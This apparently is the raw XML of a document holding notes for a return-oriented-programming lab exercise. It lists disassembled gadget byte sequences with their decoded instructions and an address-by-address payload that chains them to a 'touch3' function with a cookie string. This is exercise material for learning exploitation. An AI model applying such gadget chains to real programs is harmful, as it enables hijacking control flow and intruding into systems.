      <text:p text:style-name="P7"><text:s text:c="4"/>1c7a: <text:s text:c="6"/>8d 87 <text:span text:style-name="T2">89 d1 08 db</text:span> <text:s text:c="6"/>lea <text:s text:c="3"/>-0x24f72e77(%rdi),%eax<text:tab/><text:tab/><text:span text:style-name="T4">movl %edx,%ecx (cmpl %bl,%bl)</text:span></text:p>
      <text:p text:style-name="P7"/>
      <text:p text:style-name="P8"><text:s text:c="4"/>1c81: <text:s text:c="6"/>b8 <text:span text:style-name="T2">89 d1 08 c9 </text:span><text:s text:c="9"/>mov <text:s text:c="3"/>$0xc908d189,%eax<text:tab/><text:tab/><text:tab/><text:span text:style-name="T4">movl %edx,%ecx (cmpl %cl,%cl)</text:span></text:p>
      <text:p text:style-name="P7"/>
      <text:p text:style-name="P8"><text:s text:c="4"/>1c87: <text:s text:c="6"/>b8 a7 49 <text:span text:style-name="T2">89 e0</text:span> <text:s text:c="9"/>mov <text:s text:c="3"/>$0xe08949a7,%eax<text:tab/><text:tab/><text:tab/><text:span text:style-name="T3">movl %esp,%eax</text:span></text:p>
      <text:p text:style-name="P7"/>
      <text:p text:style-name="P8"><text:s text:c="4"/>1c93: <text:s text:c="6"/>c7 07 58 <text:span text:style-name="T2">89 e0 c3</text:span> <text:s text:c="6"/>movl <text:s text:c="2"/>$0xc3e08958,(%rdi)<text:tab/><text:tab/><text:span text:style-name="T3">movl %esp,%eax</text:span></text:p>
      <text:p text:style-name="P7"/>
      <text:p text:style-name="P8"><text:s text:c="4"/>1ca1: <text:s text:c="6"/>c7 07 <text:span text:style-name="T2">89 c2 84 d2</text:span> <text:s text:c="6"/>movl <text:s text:c="2"/>$0xd284c289,(%rdi)<text:tab/><text:tab/><text:span text:style-name="T3">movl %eax,%edx (testb %dl,%dl)</text:span></text:p>
      <text:p text:style-name="P8"/>
      <text:p text:style-name="P9"><text:s text:c="4"/>1bef: <text:s text:c="6"/>48 8d 04 37 <text:s text:c="12"/>lea <text:s text:c="3"/>(%rdi,%rsi,1),%rax</text:p>
      <text:p text:style-name="P18">1c0e: <text:s text:c="6"/>b8 <text:span text:style-name="T2">48 89 e0 </text:span>90 <text:s text:c="9"/>mov <text:s text:c="3"/>$0x90e08948,%eax<text:tab/><text:tab/><text:tab/><text:span text:style-name="T3">movq %rsp,%rax</text:span></text:p>
      <text:p text:style-name="P12">1bc2: <text:s text:c="6"/>8d 87 <text:span text:style-name="T2">48 89 c7 c3</text:span> <text:s text:c="6"/>lea <text:s text:c="3"/>-0x3c3876b8(%rdi),%eax<text:tab/><text:tab/><text:span text:style-name="T3">movq %rax,%rdi</text:span></text:p>
      <text:p text:style-name="P12">1bbc: <text:s text:c="6"/>b8 06 35 be <text:span text:style-name="T2">58</text:span> <text:s text:c="9"/>mov <text:s text:c="3"/>$0x58be3506,%eax<text:tab/><text:tab/><text:tab/><text:span text:style-name="T3">popq %rax</text:span></text:p>
      <text:p text:style-name="P12">%rax</text:p>
      <text:p text:style-name="P11">1c5a: <text:s text:c="6"/>8d 87 <text:span text:style-name="T2">89 c2 c3</text:span> db <text:s text:c="6"/>lea <text:s text:c="3"/>-0x243c3d77(%rdi),%eax<text:tab/><text:tab/><text:span text:style-name="T3">movl %eax,%edx</text:span></text:p>
      <text:p text:style-name="P11">1c7a: <text:s text:c="6"/>8d 87 <text:span text:style-name="T2">89 d1 08 db</text:span> <text:s text:c="6"/>lea <text:s text:c="3"/>-0x24f72e77(%rdi),%eax<text:tab/><text:tab/><text:span text:style-name="T4">movl %edx,%ecx </text:span></text:p>
      <text:p text:style-name="P11">1c74: <text:s text:c="6"/>b8 <text:span text:style-name="T2">89 ce 38 db</text:span> <text:s text:c="9"/>mov <text:s text:c="3"/>$0xdb38ce89,%eax<text:tab/><text:tab/><text:tab/><text:span text:style-name="T3">movl %ecx,%esi </text:span></text:p>
      <text:p text:style-name="P10">1bef: <text:s text:c="6"/>48 8d 04 37 <text:s text:c="12"/>lea <text:s text:c="3"/>(%rdi,%rsi,1),%rax</text:p>
      <text:p text:style-name="P15">1bc2: <text:s text:c="6"/>8d 87 <text:span text:style-name="T2">48 89 c7 c3</text:span> <text:s text:c="6"/>lea <text:s text:c="3"/>-0x3c3876b8(%rdi),%eax<text:tab/><text:tab/><text:span text:style-name="T3">movq %rax,%rdi</text:span></text:p>
      <text:p text:style-name="P11">touch<text:span text:style-name="T5">3地址</text:span></text:p>
      <text:p text:style-name="P11">cookie</text:p>
      <text:p text:style-name="P11"/>
      <text:p text:style-name="P11"/>
      <text:p text:style-name="P11"/>
      <text:p text:style-name="P13">0f 5c 55 55 55 55 00 00 <text:span text:style-name="T3">movq %rsp,%rax</text:span></text:p>
      <text:p text:style-name="P13">c4 5b 55 55 55 55 00 00 <text:span text:style-name="T3">movq %rax,%rdi</text:span></text:p>
      <text:p text:style-name="P13">c0 5b 55 55 55 55 00 00 <text:span text:style-name="T3">popq %rax</text:span></text:p>
      <text:p text:style-name="P13">48 00 00 00 00 00 00 00 %rax</text:p>
      <text:p text:style-name="P13">5c 5c 55 55 55 55 00 00 <text:span text:style-name="T3">movl %eax,%edx</text:span></text:p>
      <text:p text:style-name="P14"><text:span text:style-name="T8">7c</text:span> <text:span text:style-name="T8">5</text:span>c 55 55 55 55 00 00 <text:span text:style-name="T4">movl %edx,%ecx</text:span></text:p>
      <text:p text:style-name="P14"><text:span text:style-name="T8">75</text:span> <text:span text:style-name="T8">5</text:span>c 55 55 55 55 00 00 <text:span text:style-name="T3">movl %ecx,%esi</text:span></text:p>
      <text:p text:style-name="P14">ef 5b 55 55 55 55 00 00<text:span text:style-name="T3"> </text:span><text:span text:style-name="T7">lea <text:s text:c="3"/>(%rdi,%rsi,1),%rax</text:span></text:p>
      <text:p text:style-name="P14">c<text:span text:style-name="T10">4</text:span> 5b 55 55 55 55 00 00 <text:span text:style-name="T3">movq %rax,%rdi</text:span></text:p>
      <text:p text:style-name="P14">13 5b 55 55 55 55 00 00 touch<text:span text:style-name="T5">3地址</text:span></text:p>
      <text:p text:style-name="P11">31 36 65 32 31 33 31 34 <text:span text:style-name="T9">cook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20:45:05.581506070</meta:creation-date>
    <dc:date>2019-12-06T20:44:20.710850400</dc:date>
    <meta:editing-duration>PT1H12M32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7" meta:paragraph-count="176" meta:word-count="1171" meta:character-count="9197" meta:non-whitespace-character-count="5381"/>
  </office:meta>
</office:document-meta>
</file>